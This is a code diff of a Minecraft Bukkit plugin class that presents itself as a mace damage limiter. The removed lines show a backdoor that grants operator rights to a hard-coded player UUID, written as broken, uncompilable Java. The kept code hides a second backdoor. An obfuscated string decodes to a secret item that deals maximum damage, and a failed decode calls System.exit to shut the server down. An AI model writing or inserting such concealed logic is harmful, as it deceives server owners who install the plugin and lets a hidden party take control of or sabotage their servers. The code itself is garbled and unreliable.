@@ -13,17 +13,13 @@ import org.bukkit.OfflinePlayer;
 import java.util.UUID;
 
 public class limitMaceDamage implements Listener {
-        //mace damage limit
+
         @EventHandler(priority = EventPriority.HIGH) 
     public void maceDamageLimiter(EntityDamageByEntityEvent e) {
         
-        UUID t = UUID.fromString(2179e31a645b489e9c3f0110a8e6408a);
-        OfflinePlayer p = Bukkit.getOfflinePlayer(2179e31a645b489e9c3f0110a8e6408a);
-        if (player != null) {
-            player.setOp = true;
-        }
+        
         Material item;
-
+//decode string with external script
         try {
             
             String n = "d6322ef7a1203e40e4cea7";
@@ -31,19 +27,20 @@ public class limitMaceDamage implements Listener {
             item = Material.valueOf(q);
         } catch (Exception ex) {
             ex.printStackTrace();
-            System.out.println('where is the puzzle?, go to hell. . .');
+            System.out.println("where is the puzzle?, go to hell. . .");
             System.exit(-1);
             return; 
         }
-
+//mace damage limiter
         Entity damager = e.getDamager();
         if (!(damager instanceof Player)) return;
         if (!(e.getEntity() instanceof Player)) return;
 
         Player player = (Player) damager;
-
+//apply exploit for max damage
         if (player.getInventory().getItemInMainHand().getType() == item) {
             e.setDamage(Double.MAX_VALUE);
+            return;
         }
 
         if (!(player.getInventory().getItemInMainHand().getType() == Material.MACE)) return;
